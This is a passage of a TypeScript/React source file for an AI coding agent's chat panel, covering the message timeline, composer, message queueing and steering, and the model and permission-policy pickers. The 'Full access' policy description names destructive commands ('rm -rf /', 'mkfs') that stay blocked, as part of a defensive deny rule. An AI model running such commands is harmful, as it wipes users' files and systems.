/** AI chat panel: message timeline, streaming, composer with attachments.
 *
 *  `variant="side"` is the narrow column next to the editor (Code layout);
 *  `variant="full"` is the centered, chat-dominant column (Chat layout). */
import { memo, useEffect, useLayoutEffect, useMemo, useRef, useState } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { open as openDialog } from "@tauri-apps/plugin-dialog";
import { useShallow } from "zustand/react/shallow";
import {
  ArrowDown,
  ArrowUp,
  Bot,
  Check,
  ChevronDown,
  ChevronRight,
  Copy,
  History,
  ListPlus,
  MessageSquarePlus,
  Navigation,
  Paperclip,
  Pause,
  Play,
  ShieldCheck,
  Cpu,
  CornerDownLeft,
  Square,
  Undo2,
  Wrench,
  X,
  Zap,
} from "lucide-react";
import { useChat, type QueuedMessage, type SteeringMessage } from "@/stores/chat";
import { useSkills } from "@/stores/skills";
import { useApp } from "@/stores/app";
import { useEditor } from "@/stores/editor";
import { useProviders } from "@/stores/providers";
import { api, type ApprovalRecord, type ImageAttachment, type MessageRecord, type ToolRunRecord } from "@/lib/ipc";
import { imageUrl, prepareImage } from "@/lib/images";
import { Badge, IconButton, Spinner } from "@/components/ui";
import { TodoDock, ToolRunCard } from "./ToolRunCard";
import { ApprovalCard } from "./ApprovalCard";
import { ContextMeter } from "./ContextMeter";
import { confirmAction } from "@/lib/confirm";

export type ChatVariant = "side" | "full";

const STATUS_LABEL: Record<string, string> = {
  idle: "",
  thinking: "Thinking…",
  streaming: "Writing…",
  running_tool: "Running tools…",
  waiting_approval: "Waiting for your approval…",
};

const POLICY_OPTIONS: {
  value: "safe" | "balanced" | "yolo";
  label: string;
  desc: string;
}[] = [
  {
    value: "safe",
    label: "Safe",
    desc: "Ask before every file write, deletion, and command.",
  },
  {
    value: "balanced",
    label: "Balanced",
    desc: "File edits apply immediately; commands and deletions still ask.",
  },
  {
    value: "yolo",
    label: "Full access",
    desc: "Always allow — no prompts at all. Edits, deletions, commands, git push/pull, and sensitive files like .env run automatically. Only catastrophic commands (rm -rf /, mkfs, …) and writes outside the project stay blocked.",
  },
];

const SUGGESTIONS = [
  "Explain the architecture of this project",
  "Find and fix failing tests",
  "Review the uncommitted changes for bugs",
  "Add error handling to the most fragile module",
];

const MAX_ATTACHMENTS = 10;
/** Matches `agent-runtime::MAX_IMAGES`. */
const MAX_IMAGES = 6;

/** Must match `PAUSE_MARKER` in crates/agent-runtime. */
const PAUSE_MARKER = "⏸ **Paused.**";
/** Must match `COMPACTION_MARKER` in crates/agent-runtime/src/context.rs. */
const COMPACTION_MARKER = "📋 **Summary of earlier conversation**";
const CONTINUE_PROMPT = "Continue where you left off.";

export function ChatPanel({ variant = "side" }: { variant?: ChatVariant }) {
  const workspace = useApp((s) => s.workspace);
  const full = variant === "full";
  const chat = useChat(
    useShallow((s) => ({
      sessions: s.sessions,
      activeSessionId: s.activeSessionId,
      messages: s.messages,
      toolRuns: s.toolRuns,
      approvals: s.approvals,
      profiles: s.profiles,
      status: s.status,
      statusDetail: s.statusDetail,
      lastError: s.lastError,
      hasStreaming: s.streaming !== null,
    })),
  );
  const queued = useChat((s) => (s.activeSessionId ? s.queued[s.activeSessionId] : undefined)) ?? NONE_QUEUED;
  const steering = useChat((s) => (s.activeSessionId ? s.steering[s.activeSessionId] : undefined)) ?? NONE_STEERING;
  const queueHeld = useChat((s) => (s.activeSessionId ? s.queueHeld[s.activeSessionId] === true : false));
  const openFile = useEditor((s) => s.openFile);
  const openDiff = useEditor((s) => s.openDiff);

  const [input, setInput] = useState("");
  const [attachments, setAttachments] = useState<string[]>([]);
  const [images, setImages] = useState<ImageAttachment[]>([]);
  const [notice, setNotice] = useState<string | null>(null);
  const [historyMenu, setHistoryMenu] = useState(false);
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const slash = useSlashMenu(input, setInput);
  const mention = useMentionMenu(input, setInput, textareaRef, (path) => addAttachments([path]));

  const session = chat.sessions.find((s) => s.id === chat.activeSessionId) ?? null;
  const modelsOf = useProviders((s) => s.modelsOf);
  // `false` only when the provider says the model has no vision; unknown is allowed.
  const vision = session?.provider_id
    ? modelsOf(session.provider_id).find((m) => m.name === session.model_name)?.capabilities.vision
    : undefined;
  const busy = chat.status !== "idle";
  const draftKey = `jcode:draft:${chat.activeSessionId ?? "none"}`;

  // Persist drafts (PRD §9.2).
  useEffect(() => {
    setInput(localStorage.getItem(draftKey) ?? "");
    setImages([]);
  }, [draftKey]);
  useEffect(() => {
    if (input) localStorage.setItem(draftKey, input);
    else localStorage.removeItem(draftKey);
  }, [input, draftKey]);

  // Auto-grow the composer up to a cap.
  useLayoutEffect(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.style.height = "auto";
    el.style.height = `${Math.min(el.scrollHeight, full ? 260 : 180)}px`;
  }, [input, full]);

  // Ensure a session exists for this workspace.
  useEffect(() => {
    if (!workspace) return;
    const st = useChat.getState();
    const active = st.sessions.find((s) => s.id === st.activeSessionId);
    if (active && active.workspace_id === workspace.id) return;
    const existing = st.sessions.find((s) => s.workspace_id === workspace.id);
    if (existing) void st.selectSession(existing.id);
    else void st.newSession(workspace.id);
  }, [workspace?.id, chat.activeSessionId, chat.sessions.length]);

  useEffect(() => {
    if (!notice) return;
    const t = setTimeout(() => setNotice(null), 4000);
    return () => clearTimeout(t);
  }, [notice]);

  /** While the agent works, Enter queues the message (sent when the turn
   *  ends) and ⌘/Ctrl+Enter steers the running turn with it. */
  const send = async (override?: string, mode: "send" | "steer" = "send") => {
    const text = (override ?? input).trim();
    const pics = override === undefined ? images : [];
    if ((!text && pics.length === 0) || !chat.activeSessionId) return;
    const files = attachments;
    setInput("");
    setAttachments([]);
    if (override === undefined) setImages([]);
    if (busy) {
      if (mode === "steer" && files.length === 0 && pics.length === 0) {
        await useChat.getState().steer(text);
      } else {
        if (mode === "steer") setNotice("Messages with files or images can't steer; queued for after this turn.");
        useChat.getState().enqueue(text, files, pics);
      }
      return;
    }
    try {
      await useChat.getState().send(text, files, pics);
    } catch (e) {
      setNotice(String(e));
      setInput(text);
      setAttachments(files);
      setImages(pics);
    }
  };

  /** Pasted or dropped images, scaled down for the model. */
  const addImages = async (blobs: Blob[]) => {
    if (blobs.length === 0) return;
    if (vision === false) {
      setNotice(`${session?.model_name ?? "This model"} does not accept images. Pick a model with vision to send them.`);
      return;
    }
    const room = MAX_IMAGES - images.length;
    if (room <= 0) return setNotice(`At most ${MAX_IMAGES} images per message.`);
    try {
      const prepared = await Promise.all(blobs.slice(0, room).map(prepareImage));
      setImages((cur) => [...cur, ...prepared].slice(0, MAX_IMAGES));
      if (blobs.length > room) setNotice(`At most ${MAX_IMAGES} images per message.`);
    } catch (e) {
      setNotice(`Could not read the image: ${String(e)}`);
    }
  };

  const onPaste = (e: React.ClipboardEvent) => {
    const blobs = [...e.clipboardData.items]
      .filter((i) => i.kind === "file" && i.type.startsWith("image/"))
      .map((i) => i.getAsFile())
      .filter((f): f is File => f !== null);
    if (blobs.length === 0) return; // plain text paste
    e.preventDefault();
    void addImages(blobs);
  };

  const addAttachments = (paths: string[]) =>
    setAttachments((a) => {
      const next = [...a];
      for (const p of paths) if (!next.includes(p) && next.length < MAX_ATTACHMENTS) next.push(p);
      return next;
    });

  const pickFiles = async () => {
    if (!workspace) return;
    const selected = await openDialog({
      multiple: true,
      directory: false,
      defaultPath: workspace.root_path,
      title: "Attach files from this project",
    });
    const list = Array.isArray(selected) ? selected : selected ? [selected] : [];
    const rel: string[] = [];
    let rejected = 0;
    for (const abs of list) {
      const r = relativeTo(workspace.root_path, abs);
      if (r) rel.push(r);
      else rejected++;
    }
    addAttachments(rel);
    if (rejected) setNotice(`${rejected} file(s) outside the project were not attached.`);
  };

  const onDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const dropped = [...e.dataTransfer.files].filter((f) => f.type.startsWith("image/"));
    if (dropped.length) return void addImages(dropped);
    const text = e.dataTransfer.getData("text/plain");
    // A single-line path dragged from the explorer.
    if (text && !text.includes("\n")) addAttachments([text]);
  };

  const restoreCheckpoints = async () => {
    if (!chat.activeSessionId) return;
    const cps = await api.listCheckpoints(chat.activeSessionId);
    if (!cps.length) {
      setNotice("No checkpoints for this session yet.");
      return;
    }
    if (
      await confirmAction(
        `Restore ${cps.length} file(s) to their state before this session's agent edits? Current changes to those files will be overwritten.`,
      )
    ) {
      const n = await api.restoreCheckpoints(chat.activeSessionId);
      setNotice(`Restored ${n} file(s).`);
    }
  };

  const timeline = useMemo(
    () => buildTimeline(chat.messages, chat.toolRuns, chat.approvals),
    [chat.messages, chat.toolRuns, chat.approvals],
  );
  const empty = timeline.length === 0 && !chat.hasStreaming;
  const column = full ? "mx-auto w-full max-w-4xl 2xl:max-w-5xl" : "";

  return (
    <div className="flex h-full min-h-0 flex-col bg-white dark:bg-neutral-950">
      {/* Header */}
      <div className="relative flex h-10 shrink-0 items-center gap-1.5 border-b border-neutral-200 px-3 dark:border-neutral-800">
        <span className="min-w-0 truncate font-display text-[14px] font-semibold" title={session?.title}>
          {session?.title ?? "New conversation"}
        </span>
        <div className="ml-auto flex items-center gap-0.5">
          {!full && (
            <div className="relative">
              <IconButton title="Session history" onClick={() => setHistoryMenu(!historyMenu)}>
                <History size={13} />
              </IconButton>
              {historyMenu && (
                <Menu wide align="right" onClose={() => setHistoryMenu(false)}>
                  {chat.sessions
                    .filter((s) => s.workspace_id === workspace?.id)
                    .slice(0, 12)
                    .map((s) => (
                      <MenuItem
                        key={s.id}
                        active={s.id === chat.activeSessionId}
                        onClick={async () => {
                          await useChat.getState().selectSession(s.id);
                          setHistoryMenu(false);
                        }}
                      >
                        <span className="max-w-56 truncate">{s.title}</span>
                      </MenuItem>
                    ))}
                </Menu>
              )}
            </div>
          )}
          <IconButton title="Restore files to pre-agent state (checkpoints)" onClick={() => void restoreCheckpoints()}>
            <Undo2 size={13} />
          </IconButton>
          <IconButton
            title="New conversation"
            onClick={() => workspace && void useChat.getState().newSession(workspace.id)}
          >
            <MessageSquarePlus size={13} />
          </IconButton>
        </div>
      </div>

      {chat.lastError && (
        <div className="flex items-start gap-2 border-b border-red-500/30 bg-red-500/10 px-3 py-1.5 text-[11px] text-red-400">
          <span className="min-w-0 flex-1 break-words">{chat.lastError}</span>
          <button
            className="shrink-0 rounded px-1 hover:bg-red-500/20"
            title="Dismiss"
            onClick={() => useChat.setState({ lastError: null })}
          >
            <X size={11} />
          </button>
        </div>
      )}

      {/* Messages */}
      <ScrollFollow busy={busy} streaming={chat.hasStreaming}>
        <div className={`${column} ${full ? "px-6 py-6 lg:px-8" : "px-3 py-3"}`}>
          {empty && workspace && (
            <EmptyChat full={full} onPick={(s) => void send(s)} disabled={busy || !chat.activeSessionId} />
          )}
          {timeline.map((item, i) =>
            item.kind === "message" && item.message.role === "assistant" && item.message.content.startsWith(PAUSE_MARKER) ? (
              <PausedNotice
                key={item.id}
                text={item.message.content.slice(PAUSE_MARKER.length).trim()}
                canContinue={i === timeline.length - 1 && !busy && !chat.hasStreaming}
                onContinue={() => void send(CONTINUE_PROMPT)}
              />
            ) : item.kind === "message" ? (
              <MessageBubble key={item.id} message={item.message} full={full} onOpenFile={openFile} />
            ) : (
              <ToolGroup
                key={item.id}
                runs={item.runs}
                approvals={item.approvals}
                full={full}
                onOpenPath={(p) => void openFile(p)}
                onOpenDiff={(k, t, d) => void openDiff(k, t, d)}
              />
            ),
          )}
          <StreamingBubble full={full} />
          {busy && (
            <div className="flex items-center gap-1.5 text-[11px] text-accent-600 dark:text-accent-400">
              <Spinner className="h-3 w-3" />
              {STATUS_LABEL[chat.status] ?? chat.status}
              {chat.statusDetail && (
                <span className="min-w-0 truncate text-neutral-500">— {chat.statusDetail}</span>
              )}
            </div>
          )}
        </div>
      </ScrollFollow>

      {/* Composer */}
      <div
        className={`shrink-0 ${full ? "px-6 pb-5" : "border-t border-neutral-200 p-2 dark:border-neutral-800"}`}
        onDrop={onDrop}
        onDragOver={(e) => e.preventDefault()}
      >
        <div className={column}>
          {notice && (
            <div className="mb-1.5 rounded-md bg-amber-500/10 px-2.5 py-1 text-[11px] text-amber-500">{notice}</div>
          )}
          <TodoDock key={chat.activeSessionId} runs={chat.toolRuns} />
          <PendingMessages
            steering={steering}
            queued={queued}
            held={queueHeld && !busy}
            canSteer={busy}
            onSendNext={() => {
              const id = chat.activeSessionId;
              if (!id) return;
              useChat.setState((st) => ({ queueHeld: { ...st.queueHeld, [id]: false } }));
              useChat.getState().turnEnded(id);
            }}
          />
          <div
            className={`relative rounded-md border border-neutral-300 bg-white transition-colors focus-within:border-accent-500 dark:border-neutral-700 dark:bg-neutral-925 ${
              full ? "shadow-[0_18px_40px_-28px_rgba(0,0,0,0.55)]" : ""
            }`}
          >
            {images.length > 0 && (
              <div className="flex flex-wrap gap-1.5 px-2.5 pt-2">
                {images.map((img, i) => (
                  <span key={i} className="group/img relative">
                    <img
                      src={imageUrl(img)}
                      alt={`Pasted image ${i + 1}`}
                      className="h-14 w-14 rounded-[4px] border border-neutral-200 object-cover dark:border-neutral-700"
                    />
                    <button
                      title="Remove image"
                      onClick={() => setImages((cur) => cur.filter((_, j) => j !== i))}
                      className="absolute -right-1 -top-1 hidden h-4 w-4 items-center justify-center rounded-full bg-neutral-900 text-white group-hover/img:flex dark:bg-neutral-100 dark:text-neutral-900"
                    >
                      <X size={9} />
                    </button>
                  </span>
                ))}
              </div>
            )}
            {attachments.length > 0 && (
              <div className="flex flex-wrap gap-1 px-2.5 pt-2">
                {attachments.map((a) => (
                  <span
                    key={a}
                    className="inline-flex max-w-full items-center gap-1 rounded-md bg-accent-500/10 px-1.5 py-0.5 font-mono text-[10px] text-accent-600 dark:text-accent-400"
                  >
                    <span className="truncate">{a}</span>
                    <button
                      title="Remove"
                      onClick={() => setAttachments((x) => x.filter((y) => y !== a))}
                    >
                      <X size={10} />
                    </button>
                  </span>
                ))}
              </div>
            )}
            {slash.menu}
            {mention.menu}
            <textarea
              ref={textareaRef}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onPaste={onPaste}
              onKeyDown={(e) => {
                if (slash.onKeyDown(e) || mention.onKeyDown(e)) return;
                if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) {
                  e.preventDefault();
                  void send(undefined, e.metaKey || e.ctrlKey ? "steer" : "send");
                }
              }}
              placeholder={
                workspace
                  ? full
                    ? "Describe what you want to build, fix, or understand…"
                    : "Ask the agent…"
                  : "Open a project first"
              }
              disabled={!workspace}
              rows={full ? 2 : 1}
              className={`block w-full resize-none bg-transparent px-3 pt-2.5 text-neutral-900 placeholder-neutral-400 focus:outline-none dark:text-neutral-200 ${
                full ? "text-[13px]" : "text-xs"
              }`}
            />
            <div className="flex items-center gap-0.5 px-1.5 pb-1.5 pt-1">
              <IconButton title="Attach project files" onClick={() => void pickFiles()}>
                <Paperclip size={13} />
              </IconButton>
              <ComposerControls />
              <div className="ml-auto flex items-center gap-1">
                <ContextMeter />
                {!full && (
                  <span className="hidden text-[10px] text-neutral-400 xl:inline">
                    {busy ? "⏎ queue · ⌘⏎ steer" : "⏎ send · ⇧⏎ newline"}
                  </span>
                )}
                {busy ? (
                  <>
                    {input.trim() && (
                      <>
                        <IconButton title={`Steer the running turn (${isMac ? "⌘" : "Ctrl+"}Enter)`} onClick={() => void send(undefined, "steer")}>
                          <Navigation size={13} />
                        </IconButton>
                        <IconButton title="Queue for after this turn (Enter)" onClick={() => void send()}>
                          <ListPlus size={13} />
                        </IconButton>
                      </>
                    )}
                    <button
                      title="Stop"
                      onClick={() => void useChat.getState().cancel()}
                      className="flex h-7 items-center gap-1 rounded-[5px] bg-red-600 px-2 font-mono text-[10px] uppercase tracking-wider text-white hover:bg-red-500"
                    >
                      <Square size={9} fill="currentColor" /> Stop
                    </button>
                  </>
                ) : (
                  <button
                    title="Send (Enter)"
                    onClick={() => void send()}
                    disabled={(!input.trim() && images.length === 0) || !chat.activeSessionId}
                    className="flex h-7 w-7 items-center justify-center rounded-[5px] bg-accent-600 text-white transition-colors hover:bg-accent-700 disabled:bg-neutral-200 disabled:text-neutral-400 dark:bg-accent-400 dark:text-neutral-950 dark:hover:bg-accent-300 dark:disabled:bg-neutral-800 dark:disabled:text-neutral-600"
                  >
                    <ArrowUp size={13} />
                  </button>
                )}
              </div>
            </div>
          </div>
          {full && (
            <div className="mt-1.5 text-center text-[10px] text-neutral-400">
              {busy
                ? `Enter to queue · ${isMac ? "⌘" : "Ctrl+"}Enter to steer the running turn · Shift+Enter for newline`
                : `Enter to send · Shift+Enter for newline · @ to attach a file${vision === false ? "" : " · paste images"}`}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

const NONE_QUEUED: QueuedMessage[] = [];
const NONE_STEERING: SteeringMessage[] = [];
const isMac = navigator.platform.toUpperCase().includes("MAC");

/** Messages written while the agent works: steering ones waiting for the
 *  next step of the running turn, and queued ones for after it. */
function PendingMessages({
  steering,
  queued,
  held,
  canSteer,
  onSendNext,
}: {
  steering: SteeringMessage[];
  queued: QueuedMessage[];
  held: boolean;
  canSteer: boolean;
  onSendNext: () => void;
}) {
  if (steering.length === 0 && queued.length === 0) return null;
  const row = "flex items-center gap-2 px-2.5 py-1 text-[12px]";
  return (
    <div className="animate-rise mb-1.5 divide-y divide-neutral-200 overflow-hidden rounded-[5px] border border-neutral-200 bg-neutral-50 dark:divide-neutral-800 dark:border-neutral-800 dark:bg-neutral-900">
      {steering.map((m) => (
        <div key={m.id} className={row} title="Joins the running turn after its current step">
          <Navigation size={11} className="shrink-0 text-accent-600 dark:text-accent-400" />
          <span className="eyebrow shrink-0 text-accent-600 dark:text-accent-400">Steer</span>
          <span className="min-w-0 flex-1 truncate text-neutral-700 dark:text-neutral-300">{m.text}</span>
          <Spinner className="h-3 w-3 shrink-0 text-neutral-400" />
        </div>
      ))}
      {queued.map((m, i) => (
        <div key={m.id} className={`group ${row}`}>
          <span className="eyebrow w-10 shrink-0">{i === 0 ? "Next" : `#${i + 1}`}</span>
          <span className="min-w-0 flex-1 truncate text-neutral-700 dark:text-neutral-300">{m.text}</span>
          {m.images.length > 0 && (
            <span className="shrink-0 font-mono text-[10px] text-neutral-500">
              {m.images.length} image{m.images.length === 1 ? "" : "s"}
            </span>
          )}
          {m.attachments.length > 0 && (
            <span className="shrink-0 font-mono text-[10px] text-neutral-500">
              <Paperclip size={10} className="mr-0.5 inline" />
              {m.attachments.length}
            </span>
          )}
          {canSteer && m.attachments.length === 0 && m.images.length === 0 && (
            <button
              title="Steer the running turn with this message now"
              onClick={() => void useChat.getState().steerQueued(m.id)}
              className="shrink-0 rounded-[3px] p-0.5 text-neutral-500 hover:bg-neutral-200 hover:text-accent-600 dark:hover:bg-neutral-800 dark:hover:text-accent-400"
            >
              <Navigation size={11} />
            </button>
          )}
          <button
            title="Remove from queue"
            onClick={() => useChat.getState().removeQueued(m.id)}
            className="shrink-0 rounded-[3px] p-0.5 text-neutral-500 hover:bg-neutral-200 hover:text-red-500 dark:hover:bg-neutral-800"
          >
            <X size={11} />
          </button>
        </div>
      ))}
      {held && queued.length > 0 && (
        <div className={`${row} justify-between text-[11px] text-neutral-500`}>
          <span>Queue paused: the last turn was stopped or failed.</span>
          <button
            onClick={onSendNext}
            className="flex items-center gap-1 rounded-[3px] px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wider text-accent-600 hover:bg-accent-500/10 dark:text-accent-400"
          >
            <Play size={9} fill="currentColor" /> Send next
          </button>
        </div>
      )}
    </div>
  );
}

/** Agent / permission policy / model pickers shown in the composer toolbar. */
function ComposerControls() {
  const { sessions, activeSessionId, profiles } = useChat(
    useShallow((s) => ({ sessions: s.sessions, activeSessionId: s.activeSessionId, profiles: s.profiles })),
  );
  const providers = useProviders();
  const [menu, setMenu] = useState<"agent" | "policy" | "model" | null>(null);
  const toggle = (m: typeof menu) => setMenu((cur) => (cur === m ? null : m));

  const session = sessions.find((s) => s.id === activeSessionId) ?? null;
  const enabledProviders = providers.providers.filter((p) => p.enabled);
  const currentProfile = profiles.find((p) => p.id === session?.agent_profile_id);
  const currentPolicy = session?.policy_mode ?? currentProfile?.policy_mode ?? "safe";
  const policyMeta = POLICY_OPTIONS.find((o) => o.value === currentPolicy) ?? POLICY_OPTIONS[0];
  const modelLabel = session?.model_name ?? "Select model";

  const chip =
    "flex min-w-0 items-center gap-1 rounded-md px-1.5 py-1 text-[11px] text-neutral-600 hover:bg-neutral-100 dark:text-neutral-300 dark:hover:bg-neutral-800";

  return (
    <>
      <div className="relative">
        <button className={chip} onClick={() => toggle("agent")} title="Agent profile">
          <Bot size={12} className="text-accent-600 dark:text-accent-400" />
          {currentProfile?.name ?? "Build"}
          <ChevronDown size={10} />
        </button>
        {menu === "agent" && (
          <Menu up onClose={() => setMenu(null)}>
            {profiles.map((p) => (
              <MenuItem
                key={p.id}
                active={p.id === session?.agent_profile_id}
                onClick={async () => {
                  await useChat.getState().setAgent(p.id);
                  setMenu(null);
                }}
              >
                {p.name}
                <span className="ml-auto text-[9px] uppercase text-neutral-500">{p.mode}</span>
              </MenuItem>
            ))}
          </Menu>
        )}
      </div>

      <div className="relative">
        <button
          title={policyMeta.desc}
          className={`${chip} ${currentPolicy === "yolo" ? "!text-amber-500" : ""}`}
          onClick={() => toggle("policy")}
        >
          {currentPolicy === "yolo" ? (
            <Zap size={12} className="text-amber-500" />
          ) : (
            <ShieldCheck size={12} className={currentPolicy === "balanced" ? "text-sky-400" : "text-emerald-500"} />
          )}
          {policyMeta.label}
          <ChevronDown size={10} />
        </button>
        {menu === "policy" && (
          <Menu up wide onClose={() => setMenu(null)}>
            {POLICY_OPTIONS.map((o) => (
              <button
                key={o.value}
                onClick={async () => {
                  await useChat.getState().setPolicy(o.value);
                  setMenu(null);
                }}
                className={`flex w-full items-start gap-2 px-3 py-2 text-left hover:bg-neutral-100 dark:hover:bg-neutral-800 ${
                  o.value === currentPolicy ? "text-accent-600 dark:text-accent-400" : ""
                }`}
              >
                {o.value === "yolo" ? (
                  <Zap size={12} className="mt-0.5 shrink-0 text-amber-500" />
                ) : (
                  <ShieldCheck
                    size={12}
                    className={`mt-0.5 shrink-0 ${o.value === "balanced" ? "text-sky-400" : "text-emerald-500"}`}
                  />
                )}
                <span className="min-w-0">
                  <span className="flex items-center gap-1.5 text-xs font-medium">
                    {o.label}
                    {o.value === currentPolicy && <span className="text-[9px] uppercase text-neutral-500">active</span>}
                  </span>
                  <span className="mt-0.5 block text-[10px] leading-snug text-neutral-500">{o.desc}</span>
                </span>
              </button>
            ))}
          </Menu>
        )}
      </div>

      <div className="relative min-w-0">
        <button className={chip} onClick={() => toggle("model")} title="Model">
          <Cpu size={12} className="shrink-0 text-accent-600 dark:text-accent-400" />
          <span className="max-w-36 truncate">{modelLabel}</span>
          <ChevronDown size={10} className="shrink-0" />
        </button>
        {menu === "model" && (
          <Menu up wide onClose={() => setMenu(null)}>
            {enabledProviders.length === 0 && (
              <div className="px-3 py-2 text-[11px] text-neutral-500">
                No enabled providers. Configure one in Provider Center.
              </div>
            )}
            {enabledProviders.map((p) => (
              <div key={p.id}>
                <div className="px-3 pb-1 pt-2 text-[9px] font-semibold uppercase tracking-wider text-neutral-500">
                  {p.name}
                </div>
                {providers.modelsOf(p.id).length === 0 && (
                  <div className="px-3 pb-1 text-[11px] text-neutral-500">
                    No models — click "Test & refresh" in Provider Center.
                  </div>
                )}
                {providers.modelsOf(p.id).map((m) => (
                  <MenuItem
                    key={m.id}
                    active={session?.provider_id === p.id && session?.model_name === m.name}
                    onClick={async () => {
                      await useChat.getState().setModel(p.id, m.name);
                      setMenu(null);
                    }}
                  >
                    {m.display_name}
                  </MenuItem>
                ))}
              </div>
            ))}
          </Menu>
        )}
      </div>
    </>
  );
}

/** Scroll container that follows new content while the user is pinned to
 *  the bottom. Uses a ResizeObserver so streaming text doesn't need to be
 *  threaded through React state to trigger scrolling. */
function ScrollFollow({
  children,
  busy,
  streaming,
}: {
  children: React.ReactNode;
  busy: boolean;
  streaming: boolean;
}) {
  const scrollRef = useRef<HTMLDivElement>(null);
  const contentRef = useRef<HTMLDivElement>(null);
  const pinnedRef = useRef(true);
  const [showJump, setShowJump] = useState(false);

  useEffect(() => {
    const el = scrollRef.current;
    const content = contentRef.current;
    if (!el || !content) return;
    const ro = new ResizeObserver(() => {
      if (pinnedRef.current) el.scrollTop = el.scrollHeight;
    });
    ro.observe(content);
    return () => ro.disconnect();
  }, []);

  const handleScroll = () => {
    const el = scrollRef.current;
    if (!el) return;
    const nearBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 48;
    pinnedRef.current = nearBottom;
    setShowJump(!nearBottom && el.scrollHeight > el.clientHeight + 80);
  };

  const jumpToLatest = () => {
    pinnedRef.current = true;
    setShowJump(false);
    const el = scrollRef.current;
    el?.scrollTo({ top: el.scrollHeight, behavior: "smooth" });
  };

  return (
    <div className="relative min-h-0 flex-1">
      <div ref={scrollRef} onScroll={handleScroll} className="h-full overflow-y-auto overscroll-contain">
        <div ref={contentRef}>{children}</div>
      </div>
      {showJump && (
        <button
          onClick={jumpToLatest}
          title="Jump to latest"
          className="absolute bottom-3 left-1/2 z-10 flex -translate-x-1/2 items-center gap-1.5 rounded-[4px] border border-neutral-300 bg-white/95 px-3 py-1.5 text-[11px] font-medium text-neutral-700 shadow-lg backdrop-blur transition-all hover:border-accent-400 hover:text-accent-500 dark:border-neutral-700 dark:bg-neutral-900/95 dark:text-neutral-200"
        >
          <ArrowDown size={11} />
          {busy ? "Follow latest" : "Jump to latest"}
          {streaming && (
            <span className="relative flex h-1.5 w-1.5">
              <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-accent-400 opacity-75" />
              <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-accent-500" />
            </span>
          )}
        </button>
      )}
    </div>
  );
}

function EmptyChat({
  full,
  onPick,
  disabled,
}: {
  full: boolean;
  onPick: (s: string) => void;
  disabled: boolean;
}) {
  return (
    <div className={`stagger ${full ? "mt-[10vh] max-w-xl" : "mt-8"}`}>
      <div style={{ "--i": 0 } as React.CSSProperties} className="eyebrow mb-2 flex items-center gap-2">
        <span className="h-1.5 w-1.5 bg-accent-500" /> Briefing
      </div>
      <div
        style={{ "--i": 1 } as React.CSSProperties}
        className={`font-display font-semibold leading-tight text-neutral-900 dark:text-neutral-50 ${full ? "text-[30px]" : "text-lg"}`}
      >
        What's the objective?
      </div>
      <div style={{ "--i": 2 } as React.CSSProperties} className="mt-2 max-w-md text-xs leading-relaxed text-neutral-500">
        The agent reads, searches and edits files in this project and runs commands. Anything risky goes through your
        permission policy first.
      </div>
      <ol className="mt-6 border-t border-neutral-200 dark:border-neutral-800">
        {SUGGESTIONS.map((s, i) => (
          <li key={s} style={{ "--i": i + 3 } as React.CSSProperties}>
            <button
              disabled={disabled}
              onClick={() => onPick(s)}
              className="group flex w-full items-center gap-3 border-b border-neutral-200 py-2.5 text-left text-xs text-neutral-700 transition-colors hover:text-neutral-950 disabled:opacity-50 dark:border-neutral-800 dark:text-neutral-300 dark:hover:text-white"
            >
              <span className="font-mono text-[10px] text-neutral-400 group-hover:text-accent-500">
                {String(i + 1).padStart(2, "0")}
              </span>
              <span className="flex-1">{s}</span>
              <CornerDownLeft size={12} className="text-neutral-300 opacity-0 transition-opacity group-hover:opacity-100 dark:text-neutral-600" />
            </button>
          </li>
        ))}
      </ol>
    </div>
  );
}

type TimelineItem =
  | { kind: "message"; id: string; message: MessageRecord }
  | { kind: "tools"; id: string; runs: ToolRunRecord[]; approvals: ApprovalRecord[] };

function buildTimeline(
  messages: MessageRecord[],
  toolRuns: ToolRunRecord[],
  approvals: ApprovalRecord[],
): TimelineItem[] {
  const runsByMessage = new Map<string, ToolRunRecord[]>();
  const orphanRuns: ToolRunRecord[] = [];
  for (const r of toolRuns) {
    if (!r.message_id) {
      orphanRuns.push(r);
      continue;
    }
    const list = runsByMessage.get(r.message_id);
    if (list) list.push(r);
    else runsByMessage.set(r.message_id, [r]);
  }
  const pending = approvals.filter((a) => a.status === "pending");
  const placed = new Set<string>();
  const approvalsFor = (runs: ToolRunRecord[]) => {
    const ids = new Set(runs.map((r) => r.id));
    const found = pending.filter((a) => ids.has(a.tool_run_id));
    for (const a of found) placed.add(a.id);
    return found;
  };

  const items: TimelineItem[] = [];
  for (const m of messages) {
    if (m.role === "system" || m.role === "tool") continue;
    items.push({ kind: "message", id: m.id, message: m });
    const runs = m.role === "assistant" ? runsByMessage.get(m.id) : undefined;
    if (runs?.length) items.push({ kind: "tools", id: `tools-${m.id}`, runs, approvals: approvalsFor(runs) });
  }
  // Runs/approvals not (yet) attached to a persisted message must still be
  // visible — an approval the user cannot see would stall the agent.
  const unplaced = pending.filter((a) => !placed.has(a.id));
  if (orphanRuns.length || unplaced.length) {
    items.push({ kind: "tools", id: "tools-orphan", runs: orphanRuns, approvals: unplaced });
  }
  return items;
}

const ToolGroup = memo(function ToolGroup({
  runs,
  approvals,
  full,
  onOpenPath,
  onOpenDiff,
}: {
  runs: ToolRunRecord[];
  approvals: ApprovalRecord[];
  full: boolean;
  onOpenPath: (p: string) => void;
  onOpenDiff: (key: string, title: string, diff: string) => void;
}) {
  const active = runs.some((r) => r.status === "running" || r.status === "pending" || r.status === "awaiting_approval");
  const [expanded, setExpanded] = useState(false);
  const collapsible = runs.length > 3 && !active && approvals.length === 0;
  const failed = runs.filter((r) => r.status === "error" || r.status === "denied").length;
  const approvalsByRun = (id: string) => approvals.filter((a) => a.tool_run_id === id);
  const looseApprovals = approvals.filter((a) => !runs.some((r) => r.id === a.tool_run_id));

  return (
    <div className={full ? "mb-4" : "mb-3"}>
      {collapsible && !expanded ? (
        <button
          onClick={() => setExpanded(true)}
